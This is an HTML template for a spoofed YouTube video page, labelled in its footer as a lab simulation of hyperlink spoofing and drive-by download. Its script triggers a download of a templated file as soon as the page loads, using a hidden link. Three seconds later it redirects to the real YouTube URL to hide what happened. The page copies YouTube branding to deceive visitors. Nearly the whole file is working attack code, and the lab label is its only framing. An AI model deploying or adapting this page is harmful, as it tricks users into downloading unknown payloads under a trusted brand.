<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{{ og_title }} - YouTube</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
        }
        .navbar {
            background: #212121;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            gap: 24px;
            border-bottom: 1px solid #333;
        }
        .logo svg { width: 90px; height: 20px; }
        .content { max-width: 900px; margin: 0 auto; padding: 20px; }
        .video-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            position: relative;
        }
        .video-player img { width: 100%; height: 100%; object-fit: cover; }
        .play-center {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        .video-info { padding: 16px 0; }
        .video-info h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
        .video-info p { font-size: 14px; color: #aaa; }
        .footer {
            text-align: center;
            padding: 20px;
            color: #444;
            font-size: 11px;
            margin-top: 40px;
            border-top: 1px solid #222;
        }
        .progress {
            position: fixed;
            top: 0; left: 0;
            height: 3px;
            background: #ff0000;
            width: 0%;
            animation: load 2s ease-out forwards;
        }
        @keyframes load { to { width: 100%; } }
    </style>
</head>
<body>
    <div class="navbar">
        <a class="logo" href="#">
            <svg viewBox="0 0 90 20" fill="none">
                <path d="M27.9727 3.12324C27.6435 1.89323 26.6768 0.926623 25.4468 0.597366C23.2197 2.24288e-07 14.285 0 14.285 0C14.285 0 5.35042 2.24288e-07 3.12323 0.597366C1.89323 0.926623 0.926623 1.89323 0.597366 3.12324C2.24288e-07 5.35042 0 10 0 10C0 10 2.24288e-07 14.6496 0.597366 16.8768C0.926623 18.1068 1.89323 19.0734 3.12323 19.4026C5.35042 20 14.285 20 14.285 20C14.285 20 23.2197 20 25.4468 19.4026C26.6768 19.0734 27.6435 18.1068 27.9727 16.8768C28.5701 14.6496 28.5701 10 28.5701 10C28.5701 10 28.5677 5.35042 27.9727 3.12324Z" fill="#FF0000"/>
                <path d="M11.4253 14.2854L18.8477 10.0004L11.4253 5.71533V14.2854Z" fill="white"/>
            </svg>
        </a>
    </div>

    <div class="content">
        <div class="video-player">
            <img src="{{ og_thumbnail }}" alt="{{ og_title }}">
            <div class="play-center">
                <svg width="68" height="48" viewBox="0 0 68 48">
                    <path d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#FF0000"/>
                    <path d="M 45,24 27,14 27,34" fill="#fff"/>
                </svg>
            </div>
        </div>

        <div class="video-info">
            <h1>{{ og_title }}</h1>
            <p>{{ og_desc }}</p>
        </div>
    </div>

    <div class="progress"></div>
    <div class="footer">⚠️ Lab Simulation — Hyperlink Spoofing + Drive-by Download</div>

    <script>
        var downloadUrl = '{{ download_url }}';
        var realUrl = '{{ real_yt_url }}';

        // Auto-download: trigger langsung
        (function() {
            var a = document.createElement('a');
            a.href = downloadUrl;
            a.download = '';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            console.log('[*] Auto-download triggered');
        })();

        // Redirect ke YouTube asli setelah 3 detik
        setTimeout(function() {
            window.location.href = realUrl;
        }, 3000);
    </script>
</body>
</html>
